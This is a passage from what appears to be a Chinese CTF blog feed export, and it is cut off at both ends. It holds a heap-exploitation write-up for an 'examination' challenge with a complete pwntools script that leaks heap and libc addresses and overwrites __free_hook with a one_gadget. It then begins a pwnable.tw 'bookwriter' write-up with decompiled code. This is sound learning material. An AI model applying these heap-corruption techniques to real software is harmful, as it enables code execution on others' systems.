++*v1;</span><br><span class=\"line\">      nlist[a1]-&gt;win = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nlist[a1]-&gt;stu-&gt;comment )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;here is the review:&quot;</span>);</span><br><span class=\"line\">      write(<span class=\"number\">1</span>, nlist[a1]-&gt;stu-&gt;comment, nlist[a1]-&gt;stu-&gt;size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;no reviewing yet!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看到这里时，我有想到将 student comment 的 size 进行加一，或者将 student win 加（但是没啥用好像）。</p>\n<p>再来，我们还需要关注 free，程序只给了我们三次机会，而且只是将 list 中保留的 student 结构体指针清空，而没有清空其他的数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;which student id to choose?&quot;</span>);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, buf, <span class=\"number\">5uLL</span>);</span><br><span class=\"line\">      idx = atoi(buf);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">9</span> &amp;&amp; nlist[idx] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bad luck for student %d! Say goodbye to him/her!&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)idx);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( nlist[idx]-&gt;stu-&gt;message )</span><br><span class=\"line\">          <span class=\"built_in\">free</span>(nlist[idx]-&gt;stu-&gt;message);</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(nlist[idx]-&gt;stu);</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(nlist[idx]);</span><br><span class=\"line\">        nlist[idx] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        --count;</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<p>接下来思考程序对于堆块数据的输出。只有在 student 模式的 check review 可以输出 comment。</p>\n<h2 id=\"着手漏洞\"><a class=\"markdownIt-Anchor\" href=\"#着手漏洞\">#</a> 着手漏洞</h2>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>check review 有机会直接输出 student 的地址，但是分数需要够 96, 但是正常情况下是不可以的，因为 question 只能是 0~6，但是我们发现，如果学生进行过 pre，再次打分，就会被扣 10 分，而且数据比较的时候是无符号数，所以只要 question 数为 1，在 pray，被扣 10 分就会成为一个大数。输出 chunk 的地址。这里也解决了一个问题就是，因为我们释放次数有限，而且堆块大小也不可以超过 0x3ff，free 后 chunk 全部进入 tcache，没法泄露 libc，所以我们利用任意地址（一字节的数据类型）加 1，可以将一个 chunk 变得很大，free 后就可以进入 unsortedbin，后面可以申请出来，即使 tcache, 存在，也会优先使用 unsortedbin. 所以我们只要后面 write review 的时候，size&lt;=8, 就可以保留 bk 指针不被修改。但是这里我们可以用更简单的方式，直接将 size 变得更大，（两个方法都要修改保存的 comment size），直接越界输出 main_arena。</p>\n<p>后面就是一个常规的想法，因为 chunk 上有 comment 的指针，所以我们利用上面的溢出，将指针改写为 free_hook，然后再编辑该 review，把 onegadget 写入。最后 free 实际就是调用 execve ().</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>  *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">r= process(<span class=\"string\">&#x27;./examination&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&#x27;examination&#x27;</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;choice&gt;&gt;&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">changerole</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">5</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;role:&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">givescore</span>():</span><br><span class=\"line\">        ch(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addstudent</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">1</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;questions:&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">writereview</span>(<span class=\"params\">idx,size,text</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;one&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> size:</span><br><span class=\"line\">                r.sendlineafter(<span class=\"string\">&quot;comment&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(text)==size:</span><br><span class=\"line\">               r.sendafter(<span class=\"string\">&quot;comment&quot;</span>,text)</span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">                 r.sendlineafter(<span class=\"string\">&quot;comment&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">callparent</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;choose&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pray</span>():</span><br><span class=\"line\">        ch(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setmode</span>(<span class=\"params\">text</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">        r.sendafter(<span class=\"string\">&quot;mode&quot;</span>,text+<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pray_score</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;score&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">changeid</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">6</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;id&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak heap_addr</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">givescore()</span><br><span class=\"line\">writereview(<span class=\"number\">0</span>,<span class=\"number\">0x310</span>,<span class=\"string\">&quot;aaaaaaa&quot;</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">pad = <span class=\"string\">b&#x27;A&#x27;</span>*<span class=\"number\">0xa0</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x271</span>)+<span class=\"string\">b&#x27;AAAAAAAA&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">writereview(<span class=\"number\">1</span>,<span class=\"number\">0x310</span>,<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">2</span>,<span class=\"number\">0x310</span>,pad)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">3</span>,<span class=\"number\">0x20</span>,<span class=\"string\">&quot;bbbbbbbb&quot;</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">changeid(<span class=\"number\">1</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changeid(<span class=\"number\">2</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changeid(<span class=\"number\">3</span>)</span><br><span class=\"line\">pray()</span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\">givescore()</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class=\"line\">heap_addr = <span class=\"built_in\">int</span>(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap_addr : &quot;</span>,<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">aimed = (heap_addr+<span class=\"number\">0x3c9</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;aimed : &quot;</span>,<span class=\"built_in\">hex</span>(aimed))</span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;addr&quot;</span>,<span class=\"string\">&quot;00&quot;</span>+<span class=\"built_in\">str</span>(aimed))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#new student ,free to tcaceh </span></span><br><span class=\"line\">r.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">callparent(<span class=\"number\">1</span>)</span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">3</span>,<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">changerole(<span class=\"number\">1</span>)</span><br><span class=\"line\">changeid(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">aimed = heap_addr+<span class=\"number\">0x411</span></span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;addr&quot;</span>,<span class=\"string\">&quot;00&quot;</span>+<span class=\"built_in\">str</span>(aimed))</span><br><span class=\"line\">changeid(<span class=\"number\">3</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">6</span>)</span><br><span class=\"line\">libcbase = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">environ =libcbase- <span class=\"number\">0x1ef600</span></span><br><span class=\"line\">malloc_hook = libcbase + <span class=\"number\">0x1ecb70</span></span><br><span class=\"line\">free_hook = libcbase +  <span class=\"number\">0x1eee48</span></span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0xe3b31</span></span><br><span class=\"line\"><span class=\"comment\">#onegadget = 0xcafebabedeadbeef</span></span><br><span class=\"line\">changerole(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#we have already leak the libc address,</span></span><br><span class=\"line\"><span class=\"comment\">#but next how can we realize write anywhere</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">addstudent(<span class=\"number\">1</span>)</span><br><span class=\"line\">writereview(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>,<span class=\"string\">&quot;CCCC&quot;</span>)</span><br><span class=\"line\">pad =  <span class=\"string\">b&#x27;x&#x27;</span>*<span class=\"number\">0x18</span>+p64(<span class=\"number\">0x31</span>)</span><br><span class=\"line\">pad += p64(heap_addr+<span class=\"number\">0x470</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">pad += p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">1</span>)+p64(free_hook)</span><br><span class=\"line\">writereview(<span class=\"number\">3</span>,<span class=\"number\">0</span>,pad)</span><br><span class=\"line\">writereview(<span class=\"number\">4</span>,<span class=\"number\">0</span>,p64(onegadget))</span><br><span class=\"line\">callparent(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/14/heap-paradise/",
            "url": "http://example.com/2022/04/14/heap-paradise/",
            "title": "heap_paradise",
            "date_published": "2022-04-14T05:08:37.000Z",
            "content_html": "",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/10/pwnable-bookwriter/",
            "url": "http://example.com/2022/04/10/pwnable-bookwriter/",
            "title": "",
            "date_published": "2022-04-10T11:09:05.000Z",
            "content_html": "<h1 id=\"pwnabletw\"><a class=\"markdownIt-Anchor\" href=\"#pwnabletw\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUudHc=\">pwnable.tw</span>\tbookwriter\t\t\tubuntu16,libc 2.23</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ checksec --file=bookwriter</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/pwnabletw/BookWriter/bookwriter&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x400000</span>)</span><br><span class=\"line\">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>\n<h2 id=\"主要代码\"><a class=\"markdownIt-Anchor\" href=\"#主要代码\">#</a> 主要代码：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ ./bookwriter </span><br><span class=\"line\">Welcome to the BookWriter !</span><br><span class=\"line\">Author :qqqqqqqqqqq</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">      BookWriter      </span><br><span class=\"line\">----------------------</span><br><span class=\"line\"> <span class=\"number\">1.</span> Add a page        </span><br><span class=\"line\"> <span class=\"number\">2.</span> View a page       </span><br><span class=\"line\"> <span class=\"number\">3.</span> Edit a page       </span><br><span class=\"line\"> <span class=\"number\">4.</span> Information       </span><br><span class=\"line\"> <span class=\"number\">5.</span> Exit              </span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Your choice :^C</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"main函数\"><a class=\"markdownIt-Anchor\" href=\"#main函数\">#</a> main 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to the BookWriter !&quot;</span>);</span><br><span class=\"line\">  readname();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    menu();</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( getnum() )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1LL</span>:</span><br><span class=\"line\">        add();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2LL</span>:</span><br><span class=\"line\">        info();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3LL</span>:</span><br><span class=\"line\">        edit();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4LL</span>:</span><br><span class=\"line\">        updatename();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5LL</span>:</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"readname函数\"><a class=\"markdownIt-Anchor\" href=\"#readname函数\">#</a> readname 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_400BDF</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Author :&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> readck(&amp;auther, <span class=\"number\">64LL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">readck</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> len; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  len = _read_chk(<span class=\"number\">0LL</span>, a1, a2, a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( len &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_BYTE *)(len - <span class=\"number\">1LL</span> + a1) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    *(_BYTE *)(len - <span class=\"number\">1LL</span> + a1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)len;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"menu函数\"><a class=\"markdownIt-Anchor\" href=\"#menu函数\">#</a> menu 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;      BookWriter      &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 1. Add a page        &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 2. View a page       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 3. Edit a page       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 4. Information       &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; 5. Exit              &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;----------------------&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice :&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"add函数\"><a class=\"markdownIt-Anchor\" href=\"#add函数\">#</a> add 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 